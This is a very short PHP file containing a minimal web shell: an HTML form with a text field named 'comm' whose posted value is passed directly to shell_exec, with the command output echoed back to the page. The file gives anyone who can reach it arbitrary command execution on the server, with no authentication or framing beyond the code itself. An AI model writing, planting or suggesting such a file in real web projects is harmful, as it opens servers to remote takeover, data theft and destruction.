<html>
    <body>
        <form method="post" dir="data">
            <input type="text" name="comm"/>
            <input type="submit" value="exec"/>
        </form>
    </body>
</html>
<?php
if (isset($_POST['comm'])) {
    $rows = explode("\n", shell_exec($_POST['comm'].' 2>&1'));
    foreach($rows as $row) {
        echo $row.'<br/>';
    }
}